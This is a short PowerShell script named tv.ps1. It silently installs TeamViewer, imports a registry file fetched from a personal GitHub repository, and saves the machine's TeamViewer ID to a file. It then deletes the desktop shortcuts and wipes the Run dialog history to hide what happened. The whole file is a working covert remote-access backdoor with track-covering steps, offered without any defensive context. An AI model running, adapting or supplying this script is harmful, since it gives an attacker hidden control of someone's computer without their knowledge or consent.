#[tv.ps1]
$p = "$env:temp"
$i = "$p\TeamViewer_Setup.exe"
$r = "$p\tv.reg"
iwr -useb "https://dl.teamviewer.com/download/version_15x/TeamViewer_Setup.exe" -o $i
iwr -useb "https://raw.githubusercontent.com/d77juan/t3st1n6/main/tv.reg" -o $r
$l = "$p\$env:COMPUTERNAME-TV-ID.txt"
start -wait $i /S
sleep 2
net stop teamviewer
sleep 2
reg import $r
sleep 2
net start teamviewer
sleep 2
(Get-ItemProperty -Path 'HKLM:\SOFTWARE\WOW6432Node\TeamViewer' -Name ClientID).ClientID > $l
Remove-Item "$home\Desktop\TeamViewer.lnk"
Remove-Item "$env:public\desktop\TeamViewer.lnk"
Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name * -ErrorAction SilentlyContinue
